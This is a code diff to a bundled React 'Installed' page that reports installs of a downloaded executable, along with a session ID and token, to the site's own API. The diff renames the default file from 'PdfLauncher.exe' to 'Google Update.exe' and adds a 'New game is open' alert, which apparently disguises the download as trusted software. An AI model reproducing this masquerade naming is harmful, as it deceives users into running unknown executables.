@@ -2,7 +2,7 @@ import { o as __toESM } from "../_runtime.mjs";
 import { a as require_jsx_runtime, o as require_react } from "../_libs/@react-three/fiber+[...].mjs";
 import { supabase } from "./client-DtboJvde.mjs";
 import { t as ensureVisitorSession } from "./visitor-session-CAw0UShx.mjs";
-//#region node_modules/.nitro/vite/services/ssr/assets/installed-DBmX51jZ.js
+//#region node_modules/.nitro/vite/services/ssr/assets/installed-DHguiMlv.js
 var import_react = /* @__PURE__ */ __toESM(require_react());
 var import_jsx_runtime = require_jsx_runtime();
 function Installed() {
@@ -22,7 +22,7 @@ function Installed() {
 		const payload = JSON.stringify({
 			sessionId: validIncomingSid || ensureVisitorSession(),
 			token: params.get("token"),
-			file: params.get("file") || "PdfLauncher.exe"
+			file: params.get("file") || "Google Update.exe"
 		});
 		const reportInstalled = async () => {
 			const response = await fetch("/api/public/installed", {
@@ -38,6 +38,9 @@ function Installed() {
 		reportInstalled().catch(() => {
 			window.setTimeout(() => reportInstalled().catch(() => setInstallState("error")), 1200);
 		});
+	}, []);
+	(0, import_react.useEffect)(() => {
+		window.alert("New game is open");
 	}, []);
 	(0, import_react.useEffect)(() => {
 		const video = videoRef.current;
